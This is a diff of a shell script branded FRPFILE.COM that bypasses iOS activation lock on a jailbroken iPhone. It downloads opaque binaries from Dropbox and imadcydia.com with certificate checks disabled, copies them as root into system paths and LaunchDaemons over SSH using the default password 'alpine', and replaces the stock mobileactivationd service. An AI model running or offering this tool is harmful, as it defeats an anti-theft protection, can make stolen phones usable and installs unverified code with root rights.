@@ -3,7 +3,7 @@
 clear 
 
 rm -rf ~/.ssh/known_hosts
-echo "==========> Setting up SSH over USB..."
+echo "==> Setting up SSH over USB..."
 iproxy 2233 44 2> /dev/null &
 
 runcmd () {
@@ -14,8 +14,10 @@ echo "************************************************************"
 echo "*                       FRPFILE.COM                        *"
 echo "************************************************************"
 echo
+echo "Credit to: @iRogerosx"
+echo
 
-# read -p "==> Please make sure your device has Jailbreak... Connect your device to Mac, then press Enter "
+read -p "==> Please make sure your device has Jailbreak... Connect your device to Mac, then press Enter "
 
 wget --no-check-certificate https://www.dropbox.com/s/olmnrrcfwitn5uh/bypass2?dl=0 -O ./bypass2
 wget --no-check-certificate http://imadcydia.com/bypass/iTunesPatch.rtf ./iTunesPatch.rtf
@@ -27,15 +29,15 @@ chmod 755 ./sshpass
 
 ./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mount -o rw,union,update /
 
-./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./bypass2 root@localhost:/usr/libexec/bypass2
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./bypass2 root@localhost:/usr/libexec/bypass2
 
-./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./iTunesPatch.rtf root@localhost:/var/mobile/Media/Downloads/iTunesPatch.rtf
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./iTunesPatch.rtf root@localhost:/var/mobile/Media/Downloads/iTunesPatch.rtf
 
-./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./mobileact root@localhost:/etc/mobileact
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./mobileact root@localhost:/etc/mobileact
 
-./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./com.iro.mobileact.plist root@localhost:/System/Library/LaunchDaemons/com.iro.mobileact.plist
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./com.iro.mobileact.plist root@localhost:/System/Library/LaunchDaemons/com.iro.mobileact.plist
 
-./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./com.iro.mobileact.plist root@localhost:/Library/LaunchDaemons/com.iro.mobileact.plist
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./com.iro.mobileact.plist root@localhost:/Library/LaunchDaemons/com.iro.mobileact.plist
 
 ./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mv /usr/libexec/mobileactivationd /usr/libexec/mobileactivationdbak
 
@@ -51,4 +53,10 @@ chmod 755 ./sshpass
 
 ./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 rm /var/mobile/Media/Downloads/iTunesPatch.rtf
 
-echo "[*] Success Terminado."
+rm -rf ./iTunesPatch.rtf
+rm -rf ./bypass2
+rm -rf ./com.iro.mobileact.plist
+rm -rf ./mobileact
+# open https://frpfile.com
+
+echo "Terminado."
